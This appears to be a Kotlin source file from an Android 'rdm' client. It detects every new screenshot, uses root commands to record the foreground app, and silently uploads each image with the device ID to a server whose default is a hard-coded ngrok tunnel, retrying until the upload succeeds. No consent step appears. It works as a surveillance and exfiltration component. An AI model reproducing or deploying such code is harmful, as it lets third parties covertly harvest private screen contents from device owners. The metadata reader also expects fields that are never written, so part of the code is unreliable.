package com.rdm.client

import android.content.Context
import android.database.ContentObserver
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaScannerConnection
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.MediaType.Companion.toMediaType
import java.io.*
import java.text.SimpleDateFormat
import java.util.*

/**
 * Enhanced screenshot detector that duplicates screenshots to recordings directory
 * and uploads them to the server with metadata
 */
class ScreenshotDetector(
    private val context: Context,
    private val onScreenshotDetected: (String, ScreenshotMetadata) -> Unit
) {
    private val TAG = "ScreenshotDetector"

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var contentObserver: ContentObserver? = null
    private var lastScreenshotTime = 0L
    private val screenshotCooldownMs = 1000L // Prevent duplicate detection

    // Recording management
    private val recordingManager = RecordingManager(context)
    private val pendingScreenshots = mutableSetOf<ScreenshotMetadata>()
    private val screenshotMutex = Mutex()

    companion object {
        private val SCREENSHOT_PATHS = listOf(
            "/storage/emulated/0/Pictures/Screenshots/",
            "/sdcard/Pictures/Screenshots/",
            "/storage/emulated/0/DCIM/Screenshots/",
            "/sdcard/DCIM/Screenshots/"
        )
    }

    data class ScreenshotMetadata(
        val id: String,
        val originalPath: String,
        val duplicatedPath: String,
        val packageName: String,
        val timestamp: Long,
        val fileSize: Long,
        val width: Int,
        val height: Int,
        val uploaded: Boolean = false
    )

    fun start() {
        if (contentObserver != null) {
            Log.w(TAG, "Screenshot detector already running")
            return
        }

        Log.d(TAG, "Starting enhanced screenshot detector")

        contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "ContentObserver onChange triggered - uri: $uri")
                super.onChange(selfChange, uri)
                handleMediaChange(uri)
            }
        }

        // Register content observer for media changes
        val contentResolver = context.contentResolver
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            contentObserver!!
        )
        Log.d(TAG, "ContentObserver registered for MediaStore")

        // Also start periodic file system checks as backup
        startPeriodicChecks()

        // Start upload manager for pending screenshots
        startScreenshotUploadManager()

        Log.d(TAG, "Enhanced screenshot detector started")
    }

    fun stop() {
        contentObserver?.let {
            context.contentResolver.unregisterContentObserver(it)
        }
        contentObserver = null
        Log.d(TAG, "Enhanced screenshot detector stopped")
    }

    private fun handleMediaChange(uri: Uri?) {
        Log.d(TAG, "handleMediaChange called with uri: $uri")
        scope.launch {
            try {
                Log.d(TAG, "Starting media change detection")
                val now = System.currentTimeMillis()

                // Apply cooldown to prevent duplicate detections
                if (now - lastScreenshotTime < screenshotCooldownMs) {
                    return@launch
                }

                // Check if the new image is a screenshot
                val projection = arrayOf(
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE
                )

                val cursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )

                Log.d(TAG, "Query executed, cursor: ${cursor != null}")
                cursor?.let { Log.d(TAG, "Cursor count: ${it.count}") }

                cursor?.use {
                    val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val dateIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val nameIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)

                    var count = 0
                    val maxResults = 5

                    while (it.moveToNext() && count < maxResults) {
                        val filePath = it.getString(dataIndex)
                        val dateAdded = it.getLong(dateIndex) * 1000 // Convert to milliseconds
                        val fileName = it.getString(nameIndex)
                        val fileSize = it.getLong(sizeIndex)

                        // Check if this is a recent screenshot
                        if (isScreenshotFile(filePath, fileName) && dateAdded > lastScreenshotTime) {
                            lastScreenshotTime = dateAdded

                            // Process the screenshot
                            processScreenshot(filePath, fileName, fileSize, dateAdded)
                            break
                        }
                        count++
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error handling media change", e)
            }
        }
    }

    private suspend fun processScreenshot(
        originalPath: String,
        fileName: String,
        fileSize: Long,
        timestamp: Long
    ) {
        try {
            // Get image dimensions
            val options = BitmapFactory.Options().apply {
                inJustDecodeBounds = true
            }
            BitmapFactory.decodeFile(originalPath, options)
            val width = options.outWidth
            val height = options.outHeight

            // Find the current foreground app at the time of screenshot
            val rootExecutor = RootExecutor()
            val appInfo = rootExecutor.getForegroundAppInfo()
            val packageName = appInfo.packageName ?: "unknown"

            Log.d(TAG, "Processing screenshot from $packageName: $fileName (${width}x$height)")

            // Duplicate screenshot to recordings directory
            val duplicatedPath = duplicateScreenshot(originalPath, packageName, timestamp)

            if (duplicatedPath != null) {
                // Create metadata
                val metadata = ScreenshotMetadata(
                    id = generateScreenshotId(),
                    originalPath = originalPath,
                    duplicatedPath = duplicatedPath,
                    packageName = packageName,
                    timestamp = timestamp,
                    fileSize = fileSize,
                    width = width,
                    height = height,
                    uploaded = false
                )

                // Add to pending uploads
                screenshotMutex.withLock {
                    pendingScreenshots.add(metadata)
                }

                Log.d(TAG, "Screenshot duplicated and queued for upload: $duplicatedPath")

                // Notify callback
                onScreenshotDetected(packageName, metadata)

                // Try immediate upload if network available
                if (isNetworkAvailable()) {
                    uploadScreenshot(metadata)
                } else {
                    Log.d(TAG, "No network, screenshot queued for later upload")
                }
            } else {
                Log.e(TAG, "Failed to duplicate screenshot: $originalPath")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error processing screenshot", e)
        }
    }

    private suspend fun duplicateScreenshot(
        originalPath: String,
        packageName: String,
        timestamp: Long
    ): String? = withContext(Dispatchers.IO) {
        try {
            // Create screenshots directory in recordings
            val recordingsDir = context.getExternalFilesDir("Movies")
            val screenshotsDir = File(recordingsDir, "screenshots")

            if (!screenshotsDir.exists()) {
                screenshotsDir.mkdirs()
            }

            // Generate new filename with timestamp and package name
            val timestampStr = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date(timestamp))
            val newFileName = "screenshot_${packageName}_$timestampStr.png"
            val duplicatedPath = File(screenshotsDir, newFileName)

            // Copy the file
            copyFile(File(originalPath), duplicatedPath)

            // Get device ID for metadata
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            // Create metadata file
            val metadataFileName = newFileName.replace(".png", ".metadata.json")
            val metadataFile = File(screenshotsDir, metadataFileName)

            val metadataJson = org.json.JSONObject().apply {
                put("device_id", deviceId)
                put("package_name", packageName)
                put("timestamp", timestamp)
                put("original_path", originalPath)
                put("duplicated_path", duplicatedPath.absolutePath)
                put("file_size", duplicatedPath.length())
                put("created_at", System.currentTimeMillis())
                put("uploaded", false)
            }

            metadataFile.writeText(metadataJson.toString(2))

            Log.d(TAG, "Screenshot duplicated successfully: ${duplicatedPath.absolutePath}")
            duplicatedPath.absolutePath

        } catch (e: Exception) {
            Log.e(TAG, "Failed to duplicate screenshot", e)
            null
        }
    }

    private fun copyFile(source: File, destination: File) {
        source.inputStream().use { input ->
            destination.outputStream().use { output ->
                input.copyTo(output)
            }
        }
    }

    private suspend fun uploadScreenshot(metadata: ScreenshotMetadata) = withContext(Dispatchers.IO) {
        try {
            val file = File(metadata.duplicatedPath)
            if (!file.exists()) {
                Log.e(TAG, "Screenshot file not found: ${metadata.duplicatedPath}")
                removePendingScreenshot(metadata.id)
                return@withContext
            }

            // Get server URL from shared preferences
            val prefs = context.getSharedPreferences("RdmClient", Context.MODE_PRIVATE)
            val wsUrl = prefs.getString("server_url", null) ?: "wss://separately-touched-manatee.ngrok-free.app/ws/device"

            if (wsUrl.isEmpty()) {
                Log.e(TAG, "No server URL configured")
                return@withContext
            }

            // Convert WebSocket URL to HTTP URL for upload
            val uploadUrl = if (wsUrl.contains("/ws/device")) {
                val baseUrl = wsUrl.replace("ws://", "http://")
                                   .replace("wss://", "https://")
                                   .replace("/ws/device", "")
                "$baseUrl/api/screenshots/upload"
            } else {
                wsUrl.replace("ws://", "http://")
                   .replace("wss://", "https://") + "/api/screenshots/upload"
            }

            // Get device ID
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: ""

            // Build multipart request
            val client = okhttp3.OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart(
                    "screenshot",
                    file.name,
                    okhttp3.RequestBody.create(
                        "image/png".toMediaType(),
                        file
                    )
                )
                .build()

            // Build URL with query parameters
            val urlWithQuery = "$uploadUrl?device_id=$deviceId&package_name=${metadata.packageName}&timestamp=${metadata.timestamp}&width=${metadata.width}&height=${metadata.height}"

            val request = okhttp3.Request.Builder()
                .url(urlWithQuery)
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()

            if (response.isSuccessful) {
                Log.d(TAG, "Screenshot uploaded successfully: ${metadata.duplicatedPath}")
                markAsUploaded(metadata.id)
            } else {
                Log.e(TAG, "Screenshot upload failed with code: ${response.code}")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload screenshot: ${metadata.duplicatedPath}", e)
        }
    }

    private fun startPeriodicChecks() {
        scope.launch {
            while (contentObserver != null) {
                try {
                    Log.d(TAG, "Running periodic screenshot check")
                    checkScreenshots()
                    kotlinx.coroutines.delay(5000) // Check every 5 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "Error in periodic screenshot check", e)
                    kotlinx.coroutines.delay(10000) // Wait longer on error
                }
            }
        }
    }

    private fun startScreenshotUploadManager() {
        scope.launch {
            while (contentObserver != null) {
                try {
                    // Check for pending uploads
                    val pending = screenshotMutex.withLock {
                        pendingScreenshots.filter { !it.uploaded }.toList()
                    }

                    if (pending.isNotEmpty() && isNetworkAvailable()) {
                        Log.d(TAG, "Uploading ${pending.size} pending screenshots")

                        for (metadata in pending) {
                            uploadScreenshot(metadata)
                            kotlinx.coroutines.delay(1000) // Delay between uploads
                        }
                    }

                    kotlinx.coroutines.delay(60000) // Check every minute
                } catch (e: Exception) {
                    Log.e(TAG, "Error in screenshot upload manager", e)
                    kotlinx.coroutines.delay(120000) // Wait longer on error
                }
            }
        }
    }

    private suspend fun checkScreenshots() {
        try {
            Log.d(TAG, "checkScreenshots: Starting file system scan")
            val rootExecutor = RootExecutor()

            for (screenshotPath in SCREENSHOT_PATHS) {
                Log.d(TAG, "checkScreenshots: Scanning path: $screenshotPath")
                val result = rootExecutor.execute(
                    "find '$screenshotPath' -name '*.png' -type f -mtime -1 2>/dev/null | head -5",
                    useSudo = true,
                    timeoutMs = 5000
                )

                Log.d(TAG, "checkScreenshots: Result success=${result.success}, output=${result.output?.take(100)}")

                if (result.success && result.output?.isNotEmpty() == true) {
                    val files = result.output.lines().filter { it.isNotEmpty() }
                    Log.d(TAG, "checkScreenshots: Found ${files.size} files")

                    for (filePath in files) {
                        val file = File(filePath)
                        if (file.exists()) {
                            val lastModified = file.lastModified()
                            val now = System.currentTimeMillis()

                            Log.d(TAG, "checkScreenshots: File $filePath, age=${now - lastModified}ms")

                            // Check if file was created recently and not yet reported
                            if (lastModified > lastScreenshotTime &&
                                (now - lastModified) < 10000) { // Within last 10 seconds

                                Log.d(TAG, "checkScreenshots: New screenshot detected!")
                                lastScreenshotTime = lastModified

                                // Process the screenshot
                                processScreenshot(filePath, file.name, file.length(), lastModified)
                                return
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking screenshots", e)
        }
    }

    fun isScreenshotFile(filePath: String, fileName: String): Boolean {
        val lowerPath = filePath.lowercase()
        val lowerName = fileName.lowercase()

        return lowerPath.contains("screenshot") ||
               lowerName.contains("screenshot") ||
               lowerPath.contains("/pictures/screenshots/") ||
               lowerPath.contains("/dcim/screenshots/")
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val activeNetwork = connectivityManager.activeNetworkInfo
        return activeNetwork?.isConnected == true
    }

    private fun generateScreenshotId(): String {
        return "screenshot_${System.currentTimeMillis()}_${(0..999).random()}"
    }

    private suspend fun markAsUploaded(screenshotId: String) {
        screenshotMutex.withLock {
            val screenshot = pendingScreenshots.find { it.id == screenshotId }
            if (screenshot != null) {
                pendingScreenshots.remove(screenshot)
                pendingScreenshots.add(screenshot.copy(uploaded = true))

                // Update metadata file
                val metadataFile = File(screenshot.duplicatedPath.replace(".png", ".metadata.json"))
                if (metadataFile.exists()) {
                    try {
                        val metadataJson = org.json.JSONObject(metadataFile.readText())
                        metadataJson.put("uploaded", true)
                        metadataJson.put("uploaded_at", System.currentTimeMillis())
                        metadataFile.writeText(metadataJson.toString(2))
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to update metadata file", e)
                    }
                }

                Log.d(TAG, "Screenshot marked as uploaded: $screenshotId")
            }
        }
    }

    private suspend fun removePendingScreenshot(screenshotId: String) {
        screenshotMutex.withLock {
            pendingScreenshots.removeAll { it.id == screenshotId }
        }
    }

    fun getPendingScreenshots(): List<ScreenshotMetadata> {
        return runBlocking {
            screenshotMutex.withLock {
                pendingScreenshots.toList()
            }
        }
    }

    fun getAllScreenshots(): List<ScreenshotMetadata> {
        val screenshots = mutableListOf<ScreenshotMetadata>()

        try {
            val recordingsDir = context.getExternalFilesDir("Movies")
            val screenshotsDir = File(recordingsDir, "screenshots")

            if (screenshotsDir.exists()) {
                val metadataFiles = screenshotsDir.listFiles()?.filter {
                    it.name.endsWith(".metadata.json")
                } ?: return screenshots

                for (metadataFile in metadataFiles) {
                    try {
                        val metadataJson = org.json.JSONObject(metadataFile.readText())
                        val metadata = ScreenshotMetadata(
                            id = metadataJson.getString("id"),
                            originalPath = metadataJson.getString("original_path"),
                            duplicatedPath = metadataJson.getString("duplicated_path"),
                            packageName = metadataJson.getString("package_name"),
                            timestamp = metadataJson.getLong("timestamp"),
                            fileSize = metadataJson.getLong("file_size"),
                            width = metadataJson.getInt("width"),
                            height = metadataJson.getInt("height"),
                            uploaded = metadataJson.getBoolean("uploaded")
                        )
                        screenshots.add(metadata)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to parse metadata file: ${metadataFile.name}", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting all screenshots", e)
        }

        return screenshots.sortedByDescending { it.timestamp }
    }

    fun cleanup() {
        stop()
        scope.cancel()
    }
}
